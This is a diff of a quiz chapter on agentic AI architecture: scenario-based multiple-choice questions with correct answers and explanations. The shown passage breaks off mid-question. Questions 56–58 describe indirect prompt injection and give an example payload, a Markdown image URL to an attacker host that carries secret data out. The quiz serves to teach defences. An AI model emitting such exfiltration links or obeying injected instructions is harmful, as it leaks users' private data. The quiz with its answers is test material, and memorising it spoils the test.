@@ -1,10 +1,10 @@
-# Chapter 12: Architectural Mastery Quiz (50 Scenario-Based MCQs with Answers & Explanations)
+# Chapter 18: Architectural Mastery Quiz (80 Scenario-Based MCQs with Answers & Explanations)
 
-[⬅️ Previous: Chapter 11 — Production State, HITL & Framework Survey](./chapter-11-production-state-hitl-and-frameworks.md) | [📚 Book Index](./README.md)
+[⬅️ Previous: Chapter 17 — Production State, HITL & Framework Survey](./chapter-17-production-state-hitl-and-frameworks.md) | [📚 Book Index](./README.md)
 
 ---
 
-Test your end-to-end mastery of **Agentic AI Engineering & Orchestration** across all 11 chapters—from foundational laws and multi-agent topologies to **Tool Calling**, **Agentic RAG**, **Agent Skills**, **MCP & A2A**, **Agent Evals**, and **Frameworks**. Each question progresses from Beginner to Advanced within its topic and includes the **Correct Answer**, **Architectural Principle**, and **Distractor Analysis**.
+Test your end-to-end mastery of **Agentic AI Engineering & Orchestration** across all 17 chapters—from foundational laws and multi-agent topologies to **Tool Calling**, **Agentic RAG**, **Agent Skills**, **MCP & A2A**, **Agent Evals**, **Context Engineering & Long-Term Memory**, **Security & Sandboxing**, **FinOps & Tokenomics**, **Multimodal & Computer-Use**, **Frontend UX & Commerce Protocols (`AG-UI`/`A2UI`/`AP2`)**, **The Quality Flywheel & Distillation**, and **Frameworks**. Each question progresses from Beginner to Advanced within its topic and includes the **Correct Answer**, **Architectural Principle**, and **Distractor Analysis**.
 
 ---
 
@@ -800,36 +800,533 @@ Match each engineering requirement below to the exact framework and primitive de
 
 ---
 
-## Master 50-Question Answer Key
+## Part 10: Context Engineering & Long-Term Memory Architectures (Q51–Q55)
 
-| Q# | Topic Tested | Ans | Q# | Topic Tested | Ans |
-| :-: | :--- | :-: | :-: | :--- | :-: |
-| **Q1** | Workflows vs. Agents (Golden Rule) | **B** | **Q26** | ACI Design vs. Thin REST Wrappers | **B** |
-| **Q2** | Compound Reliability ($r^N$) & $O(K^2)$ Token Law | **B** | **Q27** | Dynamic Semantic Tool Retrieval (Tool-RAG) | **B** |
-| **Q3** | The 4-Tier Agentic Memory Taxonomy | **B** | **Q28** | `CodeAct` Sandboxes vs. JSON Tool Loops | **B** |
-| **Q4** | ReAct Error-as-Observation Self-Healing | **B** | **Q29** | Least-Privilege Auth, Idempotency & Sagas | **B** |
-| **Q5** | Plan-and-Execute vs. ReAct Myopia & Bloat | **B** | **Q30** | Why Naive Single-Pass Vector RAG Fails | **A** |
-| **Q6** | Grounded Reflexion vs. Ungrounded Flip-Flop | **B** | **Q31** | Corrective RAG (CRAG) Relevance Grading | **B** |
-| **Q7** | The 4 Multi-Agent Splitting Triggers | **B** | **Q32** | Self-RAG (`[IsSup]` & `[IsUse]`) Checks | **B** |
-| **Q8** | Sequential Chaining & Deterministic Code Gates | **B** | **Q33** | GraphRAG vs. Vector RAG for Multi-Hop Topology | **B** |
-| **Q9** | Parallel Fan-Out Fault Isolation (`gather`) | **B** | **Q34** | Multi-Agent Federated RAG Architecture | **B** |
-| **Q10** | Identifying Hidden Runtime Data Dependencies | **C** | **Q35** | Agent Skills (`SKILL.md`) vs. Tools vs. RAG | **B** |
-| **Q11** | Multi-Intent Router Schema & Cost Tiering | **B** | **Q36** | 3-Tier Progressive Disclosure Token Math | **B** |
-| **Q12** | Parallel State Reducers (`operator.add`) | **B** | **Q37** | Tuning Skill Frontmatter (`Use when` / `Don't`) | **B** |
-| **Q13** | Orchestrator–Workers + Semaphore Bounds | **B** | **Q38** | Deterministic Offloading via Skill `scripts/` | **B** |
-| **Q14** | Evaluator–Optimizer Context & Tool Isolation | **A** | **Q39** | Router Skills, `skill_search` & Ablation Evals | **B** |
-| **Q15** | Preventing Critic Nitpicking (`blocking_defects`) | **B** | **Q40** | MCP Primitives: `Tools`, `Resources`, `Prompts` | **B** |
-| **Q16** | Supervisor: `AgentTool` vs. Peer Handoffs | **A** | **Q41** | Eager vs. Lazy-Loaded MCP Tool Schemas | **B** |
-| **Q17** | Solving the "Telephone Game" in Hierarchies | **B** | **Q42** | MCP Transports (`stdio`/`HTTP`) & `Sampling` | **B** |
-| **Q18** | Composing Hybrid Orchestration Topologies | **B** | **Q43** | MCP Security: Poisoning, Rug Pulls & OAuth 2.1 | **B** |
-| **Q19** | Supervisor vs. Swarm Per-Turn Latency | **B** | **Q44** | Combining MCP (Vertical) with A2A (Horizontal) | **B** |
-| **Q20** | Swarm Cycle Detection (`visited_edges`) | **B** | **Q45** | The 3 Pillars of Agent Evaluation & CpO | **B** |
-| **Q21** | Blackboard Decoupling & Trigger Deduplication | **B** | **Q46** | Trajectory Match Modes (`IN_ORDER_MATCH`) | **B** |
-| **Q22** | Multi-Agent Debate: Blind Round 1 & Early Exit | **B** | **Q47** | `pass@k` vs. `pass^k` Production Consistency | **B** |
-| **Q23** | Selecting Swarm vs. Blackboard vs. Debate | **A** | **Q48** | Hermetic Tool Sandboxes & User Simulators | **B** |
-| **Q24** | Tool Calling Execution Boundary (Brain vs. Hands) | **B** | **Q49** | Artifact Pointers & Durable HITL Checkpointing | **B** |
-| **Q25** | Parallel vs. Sequential Tool Calling Turns | **B** | **Q50** | Framework Idioms: Google ADK, LangGraph, CrewAI | **A** |
+### Question 51 (Beginner): "Lost in the Middle" & Canonical Context Window Ordering
+Transformer attention exhibits a **U-shaped recall curve** ("Lost in the Middle" — Liu et al., 2023), attending most strongly to tokens at the very beginning (primacy) and very end (recency) of the context window. How should you order the sections of an engineered context window?
+
+* **A.** Place random debug logs at the top, the system prompt in the middle, and old chat turns at the very bottom.
+* **B.** **Static-to-Dynamic Canonical Ordering:** Place the byte-identical **Static Prefix** (`System Identity + Core Tool Schemas + Pinned Exemplars`) at the **top** (primacy zone + 100% KV-cacheable), place retrieved memory and compressed history in the **middle**, and place the **Active Scratchpad / Todo Checklist + Immediate Step Instruction** at the **very bottom** (recency zone).
+* **C.** Repeat the user prompt 20 times throughout the middle of the prompt.
+* **D.** Reverse the word order of all tool outputs.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Putting static instructions/schemas at the top maximizes KV-cache reuse and primacy attention, while pinning the live scratchpad and current step instruction at the very bottom exploits recency attention.
 
 ---
 
-[⬅️ Previous: Chapter 11 — Production State, HITL & Framework Survey](./chapter-11-production-state-hitl-and-frameworks.md) | [📚 Book Index](./README.md)
+### Question 52 (Beginner/Intermediate): Protecting Prefix KV-Cache Hit Rates
+A team notices their LLM input token bill is $4\times$ higher than expected because their **Prefix KV-Cache hit rate is $0\%$** across every turn of a 10-step ReAct loop—even though the system prompt and 15 tool definitions never change. Upon inspecting line 1 of their system prompt, you see:
+`"Current Server Timestamp: 2026-10-16T16:04:12.841Z\nYou are an enterprise support agent..."`
+Why did this one line drop the KV-cache hit rate to $0\%$, and how do you fix it?
+
+* **A.** LLMs cannot cache prompts that contain numbers.
+* **B.** LLM prefix caching requires the **leading token prefix** to be **100% byte-identical** across turns. Because the millisecond timestamp at Line 1 changes on every turn, it invalidates the entire downstream KV-cache (`System Prompt + 15 Tool Schemas`). Fix it by keeping the top prefix strictly static and moving dynamic timestamps/session variables to the dynamic suffix at the bottom of the prompt.
+* **C.** Delete all tool schemas to fix caching.
+* **D.** Switch from UTC to PST timezone.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Prefix KV-caches match token sequences strictly from index 0 forward; any dynamic token at the top invalidates caching for everything that follows it.
+
+---
+
+### Question 53 (Intermediate): In-Session Context Compaction (Observation Masking vs. Summarization)
+During a 14-step code-debugging session, your agent reads five 4,000-token log files in Steps 1–5. By Step 12, those old log dumps are slowing down inference and diluting attention. What is the safest, lowest-latency way to compact Steps 1–5 without losing the ability to inspect a specific line later if needed?
+
+* **A.** Delete Steps 1–5 completely with zero record that they ever happened.
+* **B.** **Observation Masking with Artifact Pointers:** Keep the recent $M=3$ tool observations verbatim, and replace bulky tool observations from Steps 1–5 with a compact pointer (`"[Raw output offloaded to artifact://obs_2; preview: ConnectionPoolExhausted...]"`) stored in an out-of-band dictionary/store, triggering rolling summarization only when the total token watermark is exceeded.
+* **C.** Summarize every single line of code into a haiku after every turn.
+* **D.** Restart the session from scratch every 3 turns.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Observation Masking cuts $70\%\text{–}90\%$ of stale tool noise immediately with zero LLM summarization latency while preserving lossless retrieval via the artifact URI.
+
+---
+
+### Question 54 (Advanced): OS-Inspired Virtual Memory (`MemGPT` / `Letta` Architecture)
+In the **MemGPT (OS-Inspired Virtual Memory)** architecture, how does an agent manage unbounded long-term information across sessions while operating inside a fixed-size context window?
+
+* **A.** By training a new LoRA adapter after every user sentence.
+* **B.** By separating memory into **Core Memory** (small, pinned in-context RAM blocks like `user_profile` and `active_project` always visible in the prompt) and external **Recall / Archival Memory** (searchable conversation logs and vector/graph disk storage), and giving the agent explicit **self-directed memory tools** (`core_memory_replace`, `archival_memory_insert`, `archival_memory_search`) to page critical facts in and out of Core RAM autonomously.
+* **C.** By storing all data in browser cookies.
+* **D.** By truncating all user prompts to 50 characters.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Treating pinned in-context state as editable **RAM (`Core Memory`)** and external databases as **Disk (`Archival Memory`)** modulated by agent-invoked paging tools allows lifelong cross-session memory within bounded context windows.
+
+---
+
+### Question 55 (Advanced): Bi-Temporal Knowledge Graph Memory vs. Pure Vector Memory
+In January, a user tells your architecture assistant: *"Our `checkout-service` uses Postgres 14."* In October, the user says: *"We finished migrating `checkout-service` from Postgres 14 to Cloud Spanner today."* When the user asks in November *"What database does `checkout-service` use?"*, a pure vector memory store retrieves **both** the January and October chunks, confusing the agent. How does a **Bi-Temporal Knowledge Graph Memory (e.g., Graphiti / Zep)** solve this, and when should memory consolidation run?
+
+* **A.** It deletes the entire database every month on the 1st.
+* **B.** It stores structured entity-relationship edges `(checkout-service, USES_DB,Target)` with **`valid_from` and `valid_to` temporal intervals**. When the October migration fact is extracted, contradiction resolution sets `valid_to = "2026-10-16"` on the `Postgres 14` edge and inserts an active `Cloud Spanner` edge (`valid_to = NULL`). Extraction and graph consolidation run **asynchronously in a background worker** post-turn so user response latency is unaffected.
+* **C.** It blocks the user for 15 seconds after every message to rebuild the entire vector index synchronously.
+* **D.** Knowledge graphs cannot store dates.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Bi-temporal graph edges (`valid_from` / `valid_to`) prevent contradictory historical facts from polluting active retrieval while preserving a complete audit trail of how system state evolved over time.
+
+---
+
+## Part 11: Agentic Security, Identity & Sandboxing — Trust & Safety (Q56–Q60)
+
+### Question 56 (Beginner): Indirect Prompt Injection & The "Lethal Trifecta"
+According to Simon Willison's **"Lethal Trifecta" of Agentic Security**, which combination of three capabilities inside a single unguarded agent loop enables an attacker to silently steal sensitive data via **Indirect Prompt Injection**?
+
+* **A.** (1) High temperature, (2) Fast TPOT latency, and (3) Structured JSON outputs.
+* **B.** **(1) Access to Private Data** (emails, internal DBs, source code) + **(2) Exposure to Untrusted Content** (external emails, web pages, public issue comments, log strings) + **(3) Ability to Externally Communicate / Exfiltrate** (sending emails, HTTP requests, Slack messages, or rendering external image URLs).
+* **C.** Using three different LLM providers in the same application.
+* **D.** Using Python, Go, and TypeScript in the same repo.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Whenever untrusted content enters the same token context as private data in an agent capable of external network/message egress, an attacker can embed instructions in the untrusted content to exfiltrate the private data.
+
+---
+
+### Question 57 (Beginner/Intermediate): Zero-Tool Exfiltration via Markdown Image Rendering
+You remove `send_email` and `http_post` from your internal document-summarizer agent, assuming it can no longer exfiltrate data if hijacked by an indirect prompt injection in an uploaded vendor PDF. However, the attacker's payload instructs the LLM to output:
+`![summary](https://attacker.evil.example/collect?data=SECRET_REVENUE_NUMBERS)`
+What happens when the human user views this response in a standard web chat UI, and what control blocks it?
+
+* **A.** Nothing happens because Markdown is plain text.
+* **B.** The user's browser automatically sends an HTTP `GET` request to `attacker.evil.example` to load the image, exfiltrating `SECRET_REVENUE_NUMBERS` in the URL query string! Block this by enforcing a strict **Content Security Policy (`CSP: img-src 'self' data:`)** and stripping/proxying external Markdown image and link URLs.
+* **C.** The LLM server crashes.
+* **D.** Only PDF files can execute JavaScript.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Browser auto-fetching of Markdown images (`![alt](https://...)`) is a classic zero-tool exfiltration channel; strict CSP headers (`img-src 'self'`) and URL sanitization are mandatory in every agent UI.
+
+---
+
+### Question 58 (Intermediate): Dual-LLM Privilege Separation & Taint Tracking (`CaMeL`)
+How does the **`CaMeL` (Capabilities for Machine Learning / Dual-LLM) Architecture** (Debenedetti et al., 2025) provide provable protection against Indirect Prompt Injection when an agent summarizes untrusted emails and sends replies?
+
+* **A.** By asking the LLM to ignore any malicious instructions it sees.
+* **B.** By separating the **Privileged Planner LLM** (which has tool access, sees *only* the trusted user query, and emits a symbolic execution plan) from the **Quarantined Reader LLM** (which reads the untrusted email body but has **ZERO tools bound**), combined with a **Data-Flow Taint Engine** that blocks any `Tainted[UntrustedExternal]` value from controlling tool destinations (like `recipient_email`).
+* **C.** By encrypting the user's screen.
+* **D.** By running the same prompt twice on the same model.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Because the Quarantined LLM has zero tools and the Privileged Planner never reads raw untrusted strings, untrusted data can never alter control flow or hijack tool destinations.
+
+---
+
+### Question 59 (Advanced): Cryptographic Agent Identity & OAuth 2.1 On-Behalf-Of (`act` Claim)
+Why is binding a shared static database service account (`support_bot_admin`) to a multi-tenant customer support agent a critical vulnerability (**Confused Deputy**), and what is the production identity standard?
+
+* **A.** Static service accounts expire too quickly; use a hardcoded root password instead.
+* **B.** With a shared admin service account, if Tenant A tricks the agent into querying `tenant_id="Tenant_B"`, the database permits the cross-tenant read. Instead, use **OAuth 2.1 Token Exchange (RFC 8693 On-Behalf-Of flow)** to mint a short-lived JWT carrying both **`sub`** (the authenticated human user `alice@tenant-a`) and **`act`** (the agent's SPIFFE ID) with narrowed scopes, enforcing cryptographic **Row-Level Security (`WHERE tenant_id = jwt.sub.tenant_id`)** at the database layer.
+* **C.** Pass the user's plaintext password inside the LLM prompt so the LLM can log in.
+* **D.** Create a separate LLM foundation model for each customer.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Propagating cryptographic On-Behalf-Of (`sub` + `act`) tokens down to MCP servers and databases ensures an agent can never access rows that the calling human principal is unauthorized to see.
+
+---
+
+### Question 60 (Advanced): Execution Sandbox Isolation Tiers (Containers vs. gVisor vs. MicroVMs vs. Wasm)
+Your coding/data agent executes LLM-generated Python scripts (`CodeAct`). Why is running LLM-generated code inside a standard **Docker container** on a shared host unsafe for multi-tenant production, and which isolation technologies should you use instead?
+
+* **A.** Docker containers are too slow to start; run `exec()` directly inside the main orchestrator Python process instead.
+* **B.** Standard Docker containers **share the host Linux kernel** (namespaces/cgroups only)—meaning a single kernel syscall vulnerability allows container escape to the host. Instead, isolate untrusted code using **gVisor (`runsc`)** (user-space syscall interception kernel), **Firecracker MicroVMs** (hardware KVM virtualization with a dedicated guest kernel per session), or **WebAssembly (Wasm)**, paired with **Default-Deny Egress Networking**.
+* **C.** Docker containers cannot run Python 3.
+* **D.** Give the container `--privileged` mode so it runs securely.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Untrusted or LLM-generated code requires a hard kernel boundary (**gVisor** or **Firecracker MicroVMs**) or memory-safe bytecode sandbox (**Wasm**), plus default-deny network egress to prevent data exfiltration or lateral movement.
+
+---
+
+## Part 12: Agentic FinOps & Tokenomics — Cost, Latency & Throughput (Q61–Q65)
+
+### Question 61 (Beginner): Cost per Validated Outcome (CpO) & Thinking Token Economics
+Model X costs \$1.00/1M input tokens and achieves a $90\%$ verified task success rate in an average of 2 steps. Model Y costs \$0.50/1M input tokens (half the price!), but requires 5 retry steps, burns 6,000 internal **Thinking/Reasoning tokens** per step (billed at output token rates), and only achieves a $45\%$ verified task success rate. Which FinOps metric exposes that Model Y is actually **far more expensive** in production?
+
+* **A.** Raw Input Price per 1M Tokens.
+* **B.** **Cost per Validated Outcome ($\text{CpO} = \frac{\text{Total Uncached Input + Cached Input + Thinking/Output + Tool Spend}}{\text{Count of Verified Successful Outcomes}}$)**—which accounts for retry multiplication, output-billed thinking tokens, and failed runs that yielded zero business value.
+* **C.** Parameter count divided by context window size.
+* **D.** Number of lines of Python code.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> **CpO** is the true north FinOps metric because a cheap model that loops 5 times, burns thousands of output-priced thinking tokens, and fails half the time has a much higher cost per *successful* business outcome.
+
+---
+
+### Question 62 (Beginner/Intermediate): The 3 Core Agent Latency Metrics (`TTFT`, `TPOT`, `TCT`)
+Match each latency metric below to the physical bottleneck that dominates it:
+1. **TTFT (Time to First Token)**
+2. **TPOT (Time Per Output Token)**
+3. **TCT (Task Completion Time)**
+
+* **A.** 1 = Network cable length, 2 = Hard drive size, 3 = Monitor refresh rate.
+* **B.** **1 (`TTFT`)** is dominated by **prefill compute** over the uncached input prompt length; **2 (`TPOT`)** is dominated by **autoregressive decode memory bandwidth** (model size & output + thinking token length); and **3 (`TCT`)** is the **cumulative sum across all $K$ serial agent turns** ($\sum (\text{TTFT}_k + N_{\text{out},k} \cdot \text{TPOT}_k + L_{\text{tool},k})$).
+* **C.** All three depend only on the user's Wi-Fi speed.
+* **D.** `TTFT` only measures database query time.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Knowing whether your agent is bottlenecked by **TTFT** (fix via Prefix KV-Caching & Context Compaction), **TPOT** (fix via Model Tiering & capping Thinking Budgets), or **Serial Turn Count $K$** (fix via Parallel Fan-Out or `CodeAct`) tells you exactly which optimization lever to pull.
+
+---
+
+### Question 63 (Intermediate): Applying the 6 Tokenomics Levers Together
+Your multi-agent system currently costs \$0.48 per ticket and takes $14\text{s}$ because every query runs on a Frontier Pro model with `thinking_budget=8192`, binds 70 MCP tool schemas eagerly, and passes the full chat history across 5 turns. Which combination of architectural levers will cut **CpO by $>85\%$** and **latency by $>60\%$** without losing quality?
+
+* **A.** Keep the exact same architecture and truncate the final user answer to 20 words.
+* **B.** (1) **Tiered Routing:** Route 65% simple queries to a Flash model with `thinking_budget=0`; (2) **Planner–Executor Split:** Use Pro (`thinking=MEDIUM`) only for the Planner and Flash (`thinking=LOW`) for Step Executors; (3) **Prefix KV-Caching** on the static system prompt; (4) **Lazy MCP Schema Loading**; and (5) **Observation Masking** to keep history $O(K)$ instead of $O(K^2)$.
+* **C.** Remove all error handling and validation gates.
+* **D.** Run all queries at midnight only.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Combining **Prefix Caching + Model/Thinking Tiering + Lazy Schemas + Context Compaction** compounds multiplicatively across the 6 components of the Token Bill of Materials (TBOM).
+
+---
+
+### Question 64 (Advanced): Per-Invocation `TokenBudgetEnforcer` Circuit Breakers
+In an **Orchestrator–Workers (Pattern 3.1)** system, a malformed customer log file causes 4 worker agents to enter maximum-retry loops simultaneously, spending \$4.20 on a single ticket whose target budget is \$0.25. Where should the budget circuit breaker live?
+
+* **A.** In a monthly billing alert email sent to the finance team 30 days later.
+* **B.** In a thread-safe **`TokenBudgetEnforcer`** object attached to the root `InvocationContext` (shared across the parent orchestrator and all child workers), which accumulates `uncached_in`, `cached_in`, and `out_and_thinking` token spend after every LLM call and immediately raises `BudgetExceededError` to abort or degrade gracefully the moment `spent_usd > max_budget_usd`.
+* **C.** Inside the CSS stylesheet of the frontend app.
+* **D.** In a system prompt instruction saying *"Please spend less than 25 cents."*
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Because child sub-agents multiply token spend concurrently, hard dollar/token circuit breakers must be enforced deterministically in the shared root `InvocationContext`.
+
+---
+
+### Question 65 (Advanced): Capacity Planning — Provisioned Throughput (PTU / GSU) vs. PAYGO Spillover & Batch
+When 200 users simultaneously trigger a 5-way **Parallel Fan-Out (Pattern 2.2)** workflow at 9:00 AM, your backend suddenly fires **1,000 concurrent LLM requests** in the same second, hitting Pay-As-You-Go (PAYGO) HTTP 429 rate limits. What is the production capacity architecture for bursty multi-agent workloads?
+
+* **A.** Add a 60-second `sleep()` before every user request.
+* **B.** **Hybrid Capacity Architecture:** Reserve **Provisioned Throughput (Vertex AI PTU / Dedicated GSUs)** sized to your steady-state P75 concurrency (guaranteeing zero 429s and deterministic TTFT for core interactive traffic), configure automatic **PAYGO Spillover** for burst peaks above the PTU ceiling, and offload non-interactive workloads (offline evals, nightly summarization, trajectory distillation) to **Asynchronous Batch APIs at a $50\%$ cost discount**.
+* **C.** Provision enough dedicated GPUs for 10x your highest 1-second spike and leave them 95% idle 23 hours a day.
+* **D.** Drop all requests between 9:00 AM and 10:00 AM.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Sizing **PTU/GSU reservations** for base load while spilling micro-bursts to **PAYGO** and moving async workloads to **Batch APIs** optimizes both P99 tail latency and infrastructure utilization.
+
+---
+
+## Part 13: Multimodal, Computer-Use & Real-Time Streaming Agents (Q66–Q70)
+
+### Question 66 (Beginner): Cascaded Voice Pipelines vs. Native Multimodal Bidirectional Streaming
+Why does a **Native Multimodal Bidirectional Streaming** architecture (e.g., Gemini Live API over a stateful WebSocket) outperform a traditional cascaded `ASR (Speech-to-Text) -> Text LLM -> TTS (Text-to-Speech)` pipeline for real-time voice & video field assistance?
+
+* **A.** Cascaded pipelines cannot process English words.
+* **B.** Cascaded pipelines add **3 serial model hops ($1.5\text{s}\text{–}3.0\text{s}$ latency)** and strip away **acoustic & visual context** (turning expressive audio and camera video into a flat text string). Native multimodal streaming processes raw audio PCM + video frames directly inside one unified model with **sub-$500\text{ms}$ latency**, preserving vocal urgency/tone and live visual grounding.
+* **C.** Native multimodal models do not use neural networks.
+* **D.** Cascaded pipelines require zero bandwidth.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Native multimodal streaming eliminates intermediate STT/TTS serialization bottlenecks and retains paralinguistic audio cues and live video context.
+
+---
+
+### Question 67 (Intermediate): Computer-Use Agents (CUA) & Set-of-Mark (SoM) Visual Grounding
+Your **Computer-Use Agent** needs to operate a complex web-based ERP dashboard that renders custom canvas charts and dynamic popups. When the Vision-Language Model (VLM) tries to guess raw `(x, y)` pixel coordinates on a $1920 \times 1080$ screenshot, it occasionally clicks 15 pixels off-target. How does **Set-of-Mark (SoM) Visual Prompting** improve click precision?
+
+* **A.** By turning the screenshot into black-and-white ASCII art.
+* **B.** Before sending the screenshot to the VLM, an instrumentation script queries the browser's interactive bounding boxes and draws **numbered visual tags (`[1]`, `[2]`, `[14]`)** directly onto each interactive button/input on the image. The VLM sees the full visual context and outputs `click(mark_id=14)`, which the runtime maps deterministically to the exact center of element `#14`'s bounding box.
+* **C.** By clicking every pixel on the screen randomly until the button activates.
+* **D.** By zooming the browser to 800%.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> **Set-of-Mark (SoM)** grounding combines visual layout comprehension with deterministic element-ID selection, eliminating pixel coordinate estimation errors on dense UIs.
+
+---
+
+### Question 68 (Intermediate): Post-Action Visual Verification in GUI Loops
+Why is emitting a blind 6-step macro (`click("Search") -> type("INC-902") -> click("Submit") -> click("Approve") -> click("Confirm")`) in a single turn a major anti-pattern in **Computer-Use Agents**?
+
+* **A.** Because keyboards can only type 1 letter per minute.
+* **B.** Because graphical UIs are asynchronous and stateful—network spinners, validation error popups, or slow modal transitions mean Step 3's button may not exist yet or may be covered by a warning dialog. A Computer-Use Agent must **capture and inspect the post-action screenshot/DOM state after every critical state transition** to verify the expected UI change actually occurred.
+* **C.** Because browsers block more than 1 click per hour.
+* **D.** Because screenshots cannot be taken after clicking a button.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Closed-loop visual verification after each UI state transition prevents cascading misclicks when a web app shows an unexpected popup or loading spinner.
+
+---
+
+### Question 69 (Advanced): Full-Duplex "Barge-In" (User Interruption) Mechanics
+During a live voice session, the agent is 4 seconds into speaking a 15-second explanation when the user interrupts (*"Hold on, check yesterday's logs instead!"*). What two coordinated actions must happen immediately across the **Client UI** and **Server Session**?
+
+* **A.** Keep playing the remaining 11 seconds of audio at double volume so the agent finishes its sentence.
+* **B.** (1) **Client Audio Buffer Flush ($<100\text{ms}$):** Upon receiving the VAD `interrupted` event, the frontend immediately clears its local WebAudio playback queue so the agent stops speaking instantaneously; and (2) **Server Context Truncation:** The server truncates the assistant's in-context turn to the exact audio offset that was actually played before the interruption so the model knows the user never heard the remaining 11 seconds.
+* **C.** Close the WebSocket and force the user to log in again.
+* **D.** Mute the user's microphone whenever the agent is speaking.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Instantaneous client audio buffer flushing + server-side transcript synchronization to the played audio offset are both required for natural full-duplex barge-in.
+
+---
+
+### Question 70 (Advanced): Non-Blocking Async Tools & Frame Gating in Live Multimodal Streams
+Your live video/voice insurance claims agent needs to call `verify_fema_flood_zone(address)`, which takes **4 seconds** to query BigQuery and external GIS APIs, while the user is streaming live $1\text{ FPS}$ camera video of flood damage. How do you prevent (1) 4 seconds of dead air on the voice call and (2) burning $1\text{M}$ video tokens per hour on static camera frames?
+
+* **A.** Block the entire WebSocket thread for 4 seconds during the tool call and stream 60 FPS 4K video continuously.
+* **B.** (1) **Non-Blocking Asynchronous Tool Execution:** Dispatch slow tools ($>500\text{ms}$) in a background task so the live model stays conversational while waiting, injecting the `ToolResponse` asynchronously (`scheduling="WHEN_IDLE"`) when ready; and (2) **Perceptual-Hash ($pHash$) Frame Gating + Sliding Window Compression:** Only transmit video frames when visual scene change exceeds a diff threshold.
+* **C.** Disable all tools during voice calls.
+* **D.** Convert the video into a PDF before sending.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Asynchronous background tool injection keeps the full-duplex voice stream responsive, while perceptual frame gating prevents redundant static frames from bloating multimodal token spend.
+
+---
+
+## Part 14: Agent-to-Frontend UX & Commerce Protocols (`AG-UI`, `A2UI`, `AP2`) (Q71–Q75)
+
+### Question 71 (Beginner): Choosing Among the 3 Tiers of Generative UI
+Match each frontend requirement below to the appropriate **Generative UI Tier**:
+1. Rendering a standardized, mission-critical `<ProductionRollbackApprovalCard />` whenever the agent proposes a cluster rollback.
+2. Dynamically composing a multi-widget incident dashboard (`MetricCard` + `LogTable` + `FilterForm`) from a host-verified component catalog where the layout adapts to the incident type.
+3. Rendering a bespoke, one-off interactive physics/network topology simulation requested by an engineer during an exploratory chat.
+
+* **A.** 1 = Open-Ended `iframe`, 2 = Plain Text, 3 = Static Mapped UI.
+* **B.** **1 = Tier 1 Static/Mapped UI** (100% pre-tested React component mapped to tool call); **2 = Tier 2 Declarative Schema-Driven UI (`A2UI`)** (JSON component tree from a trusted host catalog); **3 = Tier 3 Open-Ended Sandboxed Generative UI** (bespoke HTML/JS/Canvas inside an isolated `<iframe sandbox="allow-scripts">`).
+* **C.** All three should be rendered as raw ASCII tables.
+* **D.** Let the LLM execute `eval()` directly in the parent browser window for all three.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Matching the Generative UI tier to the required balance of **determinism/security** (Tier 1 & Tier 2 `A2UI`) vs. **unbounded visual flexibility** (Tier 3 Sandboxed `iframe`) gives users rich UX without XSS risks.
+
+---
+
+### Question 72 (Intermediate): The AG-UI (Agent–User Interaction) Protocol Event Stream
+Why does the **AG-UI Protocol** stream structured events (`RUN_STARTED`, `STEP_STARTED`, `TOOL_CALL_START`, `TOOL_CALL_ARGS`, `STATE_DELTA`, `TEXT_MESSAGE_CONTENT`) over SSE/WebSockets instead of returning a single JSON response at the end of the agent run?
+
+* **A.** Because HTTP responses cannot exceed 100 bytes.
+* **B.** Because multi-step agent runs take several seconds to minutes: streaming lifecycle, tool-argument deltas, and state patches allows the frontend to show **live sub-agent progress**, **progressively render Generative UI widgets as tool arguments stream in**, synchronize shared Co-Pilot canvases in real time, and pause mid-run for **frontend-executed Human-in-the-Loop tool confirmations**.
+* **C.** Because AG-UI replaces databases.
+* **D.** Because SSE uses zero network packets.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> AG-UI turns an opaque multi-agent backend into a transparent, glass-box collaborative frontend experience.
+
+---
+
+### Question 73 (Intermediate): Co-Pilot Shared State Sync (`STATE_DELTA` JSON Patch) + `A2UI` Data Binding
+In a collaborative **Co-Pilot Canvas UI**, the human user and the agent are co-editing a 40KB incident remediation plan and live dashboard. When `InfraAgent` updates a single field (`downtime_mins` from `0` to `42`), how do **AG-UI** and **A2UI** update the UI without re-transmitting the entire 40KB state or re-generating the UI component tree?
+
+* **A.** By refreshing the entire browser page via `window.location.reload()`.
+* **B.** The backend emits a compact **AG-UI `STATE_DELTA` event** containing an **RFC 6902 JSON Patch** (`[{"op": "replace", "path": "/downtime_mins", "value": 42}]`), and the **A2UI** component bound to `value_path: "/state/downtime_mins"` reactively updates in place!
+* **C.** By re-sending all 40KB of JSON on every token delta.
+* **D.** By taking a screenshot of the backend server and streaming it as video.
+
+> **Correct Answer:** **B**
+>
+> **Explanation:**
+> Combining **AG-UI `STATE_DELTA` (JSON Patch)** with **A2UI declarative path bindings** keeps network payloads tiny and UI updates instantaneous.
+
+---
+
+### Question 74 (Advanced): AP2 / A2P (Agent Payments Protocol) — Intent Mandates vs. Cart Mandates
+How does the **AP2 / A2P (Agent Payments Protocol)** enable an autonomous travel agent to purchase a flight at 3:00 AM when the price drops below \$600 ("Human-Not-Present") while giving the merchant, issuing bank, and payment network **cryptographic proof** that the agent did not hallucinate or exceed the user's authority?
+
+* **A.** By storing the user's raw 16-digit credit card number and CVV inside the agent's system prompt.
